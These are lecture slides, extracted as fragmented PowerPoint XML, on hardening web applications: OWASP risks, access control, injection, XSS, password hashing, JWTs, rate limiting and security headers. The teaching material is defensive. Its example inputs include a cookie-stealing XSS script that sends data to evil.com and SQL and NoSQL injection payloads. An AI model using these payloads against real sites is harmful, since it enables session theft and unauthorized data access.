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wt.io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ecurityheaders.com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securityheaders.com" TargetMode="External" /><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.ssllabs.com/ssltest/" TargetMode="External" /><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.zaproxy.org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Hardening Web Applications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Security, Performance, and Production Readiness</a:t>
            </a:r>
            <a:br/>
            <a:br/>
            <a:r>
              <a:rPr/>
              <a:t>Jason Kuruzovich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24,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Hardening Web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“it works” to “it’s ready for production”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“production hardening” means and why it matters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>OWASP Top 10 — the threats you </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1"/>
              <a:t>will</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> face</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Authentication &amp; session hardening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Input validation &amp; injection prevention</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>HTTP security headers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Infrastructure hardening (HTTPS, CORS, env vars)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Performance &amp; reliability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Monitoring &amp; observability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Hardening checklist for your capstone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1: What Is Hardening?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Gap Between “Works” and “Production”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localhost</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t>, no HTTPS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internet, TLS required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Secrets in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr>
                          <a:latin typeface="Courier"/>
                        </a:rPr>
                        <a:t>.env</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t>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Secrets in vault / env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Errors shown in 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Errors logged, generic message to user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user (you)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Thousands of concurrent users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attackers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Bots scanning within minutes of deploy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“It works on my machine”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Must work everywhere, all the time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If your app is on the public internet, it </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1"/>
              <a:t>will</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> be scanned for vulnerabilities within hours.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Hardening = Defense in Depth</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Defense in Depth Layers:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Network Layer (HTTPS, Firewall, CDN) → Transport Layer (TLS, CORS, Headers) → Application Layer (Auth, Validation, CSRF) → Data Layer (Encryption, Hashing, Backups)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>No single layer is sufficient. Each layer catches what the others miss.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2: OWASP Top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critical web application security risks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OWASP Top 10 (2021)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Broken Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – #1 risk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Cryptographic Failures</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – weak hashing, no TLS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – SQL, NoSQL, XSS, command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Insecure Design</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – flawed architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Security Misconfiguration</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – defaults, open ports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Vulnerable Components</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – outdated deps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Auth Failures</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – weak passwords, no MFA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Software/Data Integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – untrusted updates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Logging Failures</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – can’t detect breaches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="-342900" marL="342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>SSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> – server makes unintended requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Your capstone project likely touches #1, #2, #3, #5, #6, #7, and #9.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#1: Broken Access Control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>The most common vulnerability. You’ve seen this in Lab 6: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BAD: Returns ALL projects (any user's data)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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get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'/api/projects'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authenticateToken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async</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> (req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res)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{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projects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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> Project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find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// No filter!</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>  res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json</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(projects)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GOOD: Filter by authenticated user</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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get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'/api/projects'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authenticateToken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async</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> (req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res)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{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projects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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> Project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find</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>userId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req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user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userId</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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res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json</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(projects)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 b="1"/>
              <a:t>Checklist:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Every query filters by </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>userId</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> or checks ownership</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Admin-only routes verify role, not just authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Direct object references (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/api/projects/123</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) check ownership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#3: Injection Attacks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SQL Injection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BAD: String concatenation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query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`SELECT * FROM users WHERE name = '${</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>req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body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}'`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// Input: ' OR '1'='1  → returns all users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GOOD: Parameterized query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query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'SELECT * FROM users WHERE name = $1'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db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query</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(query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[req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body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name</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>])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NoSQL Injection (MongoDB)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BAD: Passing raw body to query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user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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> User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findOne</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(req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body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// Input: {"username": {"$gt": ""}, "password": {"$gt": ""}}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GOOD: Extract and validate specific fields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user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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> User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findOne</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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username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String</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(req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body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username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#3: Cross-Site Scripting (XSS)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BAD: Rendering user input as HTML</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>element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innerHTML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userComment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// Input: &lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;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React is safe by default — JSX escapes values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p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{userComment}</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>&gt;;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// Renders as text, not HTML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</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>DANGER</a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>: React's escape hatch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div dangerouslySetInnerHTML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{{</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>__html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userComment}} </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/&gt;;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// XSS!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Key defenses:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Use frameworks that auto-escape (React, Angular, Vue)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Never use </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> with user data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Use Content Security Policy (CSP) headers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Store JWTs in </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>httpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> cookies (not </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) when possible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3: Authentication Hardening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Password Storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>What you learned in Lab 6, reinforced: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Plaintext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Catastrophic – one breach exposes all passwords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MD5 / SHA-256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Bad – fast hashes are brute-forceable (billions/sec on GPU)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bcrypt (cost 10)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 – intentionally slow (~100ms per hash)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Argon2id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– memory-hard, resists GPU/ASIC attacks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bcrypt — what we used in Lab 6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hash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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> bcrypt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hash</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(password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12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// cost factor 12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Argon2 — the current recommendation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hash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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> argon2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hash</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(password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type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argon2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argon2id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memoryCost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65536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// 64 MB — memory hardness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timeCost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parallelism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br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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JWT Hardening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Beyond what Lab 6 covered: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36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Practice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Short access token TTL (15 min)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Limits damage window if stolen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Rotate refresh tokens on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 token reuse (theft indicator)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Store </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr>
                          <a:latin typeface="Courier"/>
                        </a:rPr>
                        <a:t>JWT_SECRET</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> in env vars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Never hardcode secrets in source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RS256 (asymmetric) in production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key can verify without exposing signing key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Validate </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr>
                          <a:latin typeface="Courier"/>
                        </a:rPr>
                        <a:t>iss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aud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exp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> claims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Prevent token from other apps being accepted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Revocation list for refresh tokens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Enable true logout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Never</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> put sensitive data (passwords, SSNs) in JWT payloads. They are signed, not encrypted — anyone can decode them at </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jwt.io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Rate Limiting &amp; Brute Force Protection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rateLimit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require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'express-rate-limit'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General API rate limit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apiLimiter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rateLimit</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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windowMs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15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60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// 15 minutes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max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// 100 requests per window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message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{ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>error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'Too many requests, try again later'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> }</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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Stricter limit on auth endpoints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authLimiter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rateLimit</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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windowMs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15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60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max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// 5 login attempts per 15 min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message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{ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>error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'Too many login attempts'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> }</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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use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'/api/'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apiLimiter)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app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use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'/api/login'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authLimiter)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app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use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'/api/register'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authLimiter)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Rate Limiting Algorithms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2100"/>
                <a:gridCol w="1841500"/>
                <a:gridCol w="850900"/>
                <a:gridCol w="850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It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Fixed Window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requests in fixed time slots (e.g., 0:00–0:15)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Simple to implement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 at window boundary (2x allowed)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Sliding Window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Rolling window based on each request’s timestamp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Smooth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More memory (per-request timestamps)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Token Bucket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Bucket refills at steady rate; each request takes a token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Allows short bursts, smooth average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Slightly complex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Leaky Bucket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Requests queue and drain at fixed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smooth output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Queuing adds latency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express-rate-limit</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> uses </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>fixed window</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> by default. For distributed systems, use a </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Redis-backed store</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> so limits are shared across instances.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Rate Limiting: Headers &amp; Client Behavior</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Standard response headers communicate limits to clients:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>HTTP/1.1 200 OK
X-RateLimit-Limit: 100          # Max requests per window
X-RateLimit-Remaining: 47       # Requests left in current window
X-RateLimit-Reset: 1714070400   # Unix timestamp when window resets
HTTP/1.1 429 Too Many Requests  # When limit is exceeded
Retry-After: 120                # Seconds until client should retry</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Client best practices:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Read </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>Retry-After</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> header and wait before retrying</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>exponential backoff</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>: 1s → 2s → 4s → 8s (not tight loops)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Cache responses to reduce request count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Rate Limiting in Production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RedisStore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require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'rate-limit-redis'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{ createClient }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require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'redis'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redisClient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createClient</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>url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process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env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REDIS_URL</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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Distributed rate limiter — shared across all app instances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apiLimiter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rateLimit</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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windowMs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15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60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max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standardHeaders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true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// Send X-RateLimit-* headers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legacyHeaders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false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store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new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RedisStore</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>sendCommand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args)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redisClient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sendCommand</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(args)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})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 b="1"/>
              <a:t>Why Redis?</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> In-memory rate limits reset when a process restarts and aren’t shared across instances. Redis gives you a single counter across your entire fleet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>API Gateway rate limiting:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> AWS API Gateway, CloudFront, and Vercel all offer platform-level rate limiting — consider layering these with application-level limits.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4: HTTP Security Headers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Security Headers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>helmet</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> middleware — one line adds all critical headers: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helmet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require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'helmet'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app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use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helmet</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>())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/>
              <a:t>What </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>helmet()</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> sets: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705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Purpose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Content-Security-Policy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Restricts where scripts/styles/images can load from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X-Content-Type-Options: nosniff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Prevents MIME-type sniffing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X-Frame-Options: DENY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Prevents clickjacking via iframes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Strict-Transport-Security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Forces HTTPS for future requests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X-XSS-Protection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Legacy XSS filter (defense in depth)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Referrer-Policy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 referrer info sent to other sites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your headers at </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>securityheaders.com</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — aim for an A grade.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Content Security Policy (CSP) Deep Dive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>CSP is the most powerful header — it whitelists allowed sources:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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use</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(helmet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contentSecurityPolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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directives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{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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>defaultSrc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"'self'"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      </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// Only load from same origin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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>scriptSrc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"'self'"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       </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// No inline scripts, no CDN scripts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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>styleSrc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"'self'"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"'unsafe-inline'"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// Allow inline styles (for frameworks)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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>imgSrc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"'self'"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"data:"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"https:"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// Allow images from HTTPS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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>connectSrc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"'self'"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"https://api.example.com"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// API whitelist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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>fontSrc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"'self'"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"https://fonts.gstatic.com"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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>objectSrc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"'none'"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       </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// No Flash/Java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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>upgradeInsecureRequests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[]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 </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// Auto-upgrade HTTP to HTTPS</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>  }</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>}))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/>
              <a:t>If an XSS payload tries to load a script from </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, CSP blocks it.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5: Infrastructure Hardening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HTTPS Everywhere</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>HTTPS Flow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
